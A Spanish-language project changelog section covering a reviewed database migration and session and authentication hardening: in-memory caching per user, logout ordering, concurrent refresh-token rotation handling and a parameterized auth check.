- **Migración**: `20260924210000_stock_idempotency_balance_check` fue generada offline y revisada a mano (cero `DROP`/`TRUNCATE`/`DELETE`, cero `ON DELETE CASCADE`); aplicada a `demo` el 2026-09-25 (Etapa 5C.1C) con `db:migrate:deploy`, tras verificar la precondición (0 saldos negativos); `production` no se tocó. La integración real de 5C.1C usa solo fixtures `test-5c1-<RUN>` y verifica conteos globales y filas reales idénticos al terminar. Sin secretos nuevos ni variables de entorno nuevas.

## Actualización — Rendimiento y sesión (Etapa 5P)

- **Caché de datos solo en memoria**, con claves por usuario (`['session', userId, …]`) y vaciada (cancelando lo que está en vuelo) en login, logout y pérdida de sesión: nunca se muestran datos de otra persona ni sobreviven a un logout. Sin `localStorage`/`sessionStorage`/IndexedDB ni persistidores (test estático). El access token sigue solo en memoria y el refresh token solo en la cookie `HttpOnly`.
- **Logout**: primero limpia token (nueva época), caché y vista protegida; luego espera al refresh en vuelo y recién entonces llama a `/auth/logout`, para revocar la cookie más reciente aunque un refresh haya rotado la sesión a destiempo.
- **Refresh concurrente**: `P2028`/`P2034` nunca llegan crudos. Perdedor de una carrera → revocación conservadora confirmada en una transacción propia + auditoría `auth.refresh.concurrent_rotation_detected` + `401` genérico. Falla de infraestructura sin carrera → `503 AUTH_REFRESH_UNAVAILABLE` sin cambios de estado. Se conserva `session.userId === token.sub`.
- **`requireAuth`** mantiene exactamente las mismas verificaciones (sesión existente, no revocada, vigente, del mismo `sub`; usuario `ACTIVE`; rol de la base, no del JWT) en una sola sentencia SQL estática y parametrizada (el `sid`, ya validado como UUID, viaja como parámetro; nunca se interpola). Integración real: revocada, vencida, `sub`/`sid` cruzados y usuario `SUSPENDED` → `401 AUTH_REQUIRED` genérico; EMPLOYEE → `403` en rutas admin aunque el JWT diga ADMIN.
- Reintentos automáticos: ningún POST se repite salvo el reintento único central tras 401 + refresh (el request original fue rechazado sin ejecutarse).
